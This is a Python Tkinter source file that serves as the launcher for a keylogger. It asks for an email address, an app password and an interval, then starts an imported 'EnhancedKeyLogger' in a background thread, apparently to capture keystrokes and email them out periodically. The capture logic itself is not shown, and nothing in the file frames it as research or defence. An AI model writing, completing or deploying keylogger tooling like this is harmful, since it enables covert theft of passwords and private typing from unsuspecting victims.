import tkinter as tk
import pyfiglet
from keywatch.keylogger import EnhancedKeyLogger
import threading
import sys

class KeyLoggerUI():
    def __init__(self, root):
        self.root = root
        self.logger_instance = None
        self.start()

    def start_logger(self):
        email = self.email_entry.get()
        password = self.password_entry.get()
        try:
            interval = int(self.interval_entry.get())
        except ValueError:
            self.status_label.config(text="Interval must be a number!", fg="red")
            return
        self.logger_instance = EnhancedKeyLogger(email, password, interval)
        # Start the keylogger in a separate thread
        threading.Thread(target=self.logger_instance.start, daemon=True).start()
        self.status_label.config(text="Keylogger started...", fg="green")
        print("[+] Keylogger started successfully. Listening for keystrokes...")
        self.start_button.config(state=tk.DISABLED)

    def on_closing(self):
        if self.logger_instance and self.logger_instance.timer:
            self.logger_instance.timer.cancel()  # Stop the repeating timer
        self.root.destroy()
        sys.exit()

    def start(self):
        tk.Label(self.root, text="Email:").grid(row=0, column=0, padx=10, pady=5, sticky="e")
        self.email_entry = tk.Entry(self.root, width=30)
        self.email_entry.grid(row=0, column=1)
        tk.Label(self.root, text="App Password:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
        self.password_entry = tk.Entry(self.root, width=30, show="*")
        self.password_entry.grid(row=1, column=1)
        tk.Label(self.root, text="Interval (sec):").grid(row=2, column=0, padx=10, pady=5, sticky="e")
        self.interval_entry = tk.Entry(self.root, width=10)
        self.interval_entry.grid(row=2, column=1, sticky="w")
        self.start_button = tk.Button(self.root, text="Start KeyLogger", command=self.start_logger)
        self.start_button.grid(row=3, column=0, columnspan=2, pady=10)
        self.status_label = tk.Label(self.root, text="", fg="green")
        self.status_label.grid(row=4, column=0, columnspan=2)

if __name__ == "__main__":
    root = tk.Tk()
    banner = pyfiglet.print_figlet("KEY LOGGER")
    root.title("KeyLogger Launcher")
    root.geometry("320x180")
    root.resizable(False, False)
    app = KeyLoggerUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
